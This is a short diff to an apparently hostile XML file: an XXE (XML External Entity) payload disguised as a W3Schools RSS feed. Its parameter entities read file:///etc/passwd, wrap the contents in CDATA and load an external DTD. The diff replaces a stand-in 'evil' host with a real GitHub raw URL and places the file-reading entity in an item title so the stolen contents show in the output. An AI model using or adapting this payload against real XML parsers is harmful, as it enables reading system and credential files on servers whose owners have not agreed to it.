@@ -3,17 +3,16 @@
  <!ENTITY % start "<![CDATA[">
  <!ENTITY % stuff SYSTEM "file:///etc/passwd">
 <!ENTITY % end "]]>">
-<!ENTITY % dtd SYSTEM "http://evil/evil.xml">
+<!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/pszot/publicscripts/master/external.xml">
 %dtd;
 ]>
-<root>&all;</root>
 <rss version="2.0">
 <channel>
   <title>W3Schools Home Page</title>
-  <link>&exfil;</link>
+  <link>http://www.w3schools.com/xml/xml_rss.asp</link>
   <description>Free web building tutorials</description>
   <item>
-    <title>asdfg</title>
+    <title>&all;</title>
     <link>http://www.w3schools.com/xml/xml_rss.asp</link>
     <description>New RSS tutorial on W3Schools</description>
   </item>
